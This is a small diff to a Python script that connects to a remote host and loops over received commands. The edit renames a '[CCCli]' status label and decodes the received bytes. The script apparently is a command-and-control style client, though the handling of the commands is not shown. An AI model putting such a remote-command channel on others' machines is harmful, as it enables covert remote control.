@@ -19,11 +19,11 @@ else:
 # connection ============================================= #
 def connect():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	print( "[] Attempting to connect to {} on port {} ...".format(host, port) )
+	print( "[CCCli] Attempting to connect to {} on port {} ...".format(host, port) )
 	s.connect((host, port))
 
 	while True: 
-		command = s.recv(1024)
+		command = s.recv(1024).decode()
 
 		if command == '==terminate':
 			s.close()
